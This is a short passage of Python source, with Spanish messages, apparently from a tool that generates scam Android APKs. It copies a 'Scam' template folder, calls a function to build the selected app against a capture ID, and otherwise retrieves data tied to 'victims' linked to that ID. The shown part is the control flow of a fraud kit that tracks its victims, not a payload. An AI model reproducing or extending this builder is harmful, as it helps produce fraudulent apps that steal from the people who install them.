            if chek == False:
                print("[ID] NO ENCONTRAMOS VICTIMAS RELACIONADAS A TU ID")
                exit(0)

            temp.close()
            os.remove(".temp")

    if selec in base_apk:

        try:
            if "Scam_2" in ver_carpeta:
                shutil.rmtree(".scripts/sc4pk/Scam_2")
                shutil.copytree(".scripts/sc4pk/Scam",".scripts/sc4pk/Scam_2")
            else:
                shutil.copytree(".scripts/sc4pk/Scam",".scripts/sc4pk/Scam_2")    # Bloque encargado de verificar si hay el apk que se va a crear

        except Exception as err:
            print(err)

        crear(selec, idcap)
    
    else:
        print("[ERROR] Opcion ingresada no valida...")
    
    if selec == None:
        
        obtener(idcap)
#################################